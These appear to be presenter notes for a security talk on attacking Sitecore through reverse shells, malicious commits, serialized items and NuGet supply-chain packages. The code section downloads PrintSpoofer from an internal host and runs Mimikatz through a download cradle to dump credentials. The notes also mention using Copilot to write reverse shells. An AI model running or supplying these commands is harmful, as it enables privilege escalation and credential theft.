# code for the sugnl presentation "hacking sitecore"

## agenda

  1. opening
     1. nuget pull request -> who would approve? why (not?)
  2. Reverse shell explanation
     1. what is a reverse shell?
     2. show reverse shell with copilot
        1. show reverse shell creation using copilot and copilot x
        2. show that it works with kali. Show some commands, privileges
  3. EVIL DEV: How to get this to work in Sitecore?
     1. open sitecore, show same magic.
        1. docker: no internal networking, but internet, so use ngrok
        2. show ngrok
        3. ngrok in kali
        4. netcat kali
        5. privilege escalation for powershell disabled -> as an attacker, just enable it ;)
           1. ```services:cm:environment:SITECORE_SPE_ELEVATION:"Allow"``` 
        6. write code
        7. run to test!
           1. two windows side by side
  4. Infect a co-worker
     1. QUESTION - how could we compromise another user? abd how could we compromise a dev/test/acc/prd environment? (use config prd??) - environments which we don't have access to.
        1. discuss with public
     2. non-suspicious DEV: ```**example-1**```
        1. right, let's take a look
        2. pull code, modify IP/ngrok endpoint (or prep another port/ip for this)
        3. MALOCIOUS DEV: push code to git
        4. what does a dev do first thing in the day?
           1. DEV: pull code (branch prepped for sugnl)
           2. up.ps1 - for demo purposes, separate vm without docker           
              1. OR sync code
              2. we do dotnet sitecore ser push
           3. gotcha!
        5. what if: dev takes a look inside sitecore
           1. doesn't see it -> SPE ELEVATION
        6. what if: dev checks the actual yml files?
           1. busted
        7. What can we do to prevent this?
           1. move to dat files
           2. ```**example-2**```
              1. deploy 
                 1. prep once, deploy with config
                 2. show binary data with multiple yaml files
                 3. environment condition?? (only production/test/whatsoever?)
     3. TEST/PRD environment
        1. how could we compromise this one IF the user above checks everything?
        2. ```**example-3**```
           1. nuget approach with update
              1. sitestep to installation.ps1 / init.ps1 ???
                 1. vulnerable as well
        3. create a package wich is ok -> include in platfrom
           1. prepare this demo, have it deployed!
        4. create a package which is not ok
        5. run renovate bot
        6. deploy, gotcha 
     4. pwn the credentials and get na authority\system credentials
     5. 

## items
  
  1. remove all items before demo
  2. open powershell
  3. write powershell
  4. show task scheduler 30 seconds
  5. show that it works
  6. in case of emergency: pull branch and push items ;)


## code

show current user

```batch
whoami
iis apppool
```

```batch
whoami \priv
**SeImpersonatePrivilege**
```

download printspoofer

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://172.26.1.236/
PrintSpoofer64.exe','C:\inetpub\wwwroot\XM1.cm\printspoofer.exe')

(New-Object System.Net.WebClient).DownloadFile('http://172.26.1.236/PrintSpoofer64.exe','C:\inetpub\wwwroot\XP0.sc\printspoofer.exe')
```

show new current user
```powershell
.\printspoofer.exe -i -c "powershell.exe whoami"
```

mimikatz
```powershell
.\printspoofer.exe -i -c "powershell.exe IEX (New-Object System.net.webclient).DownloadString('http://172.26.1.236/im.ps1');Invoke-Mimikatz -DumpCreds"
```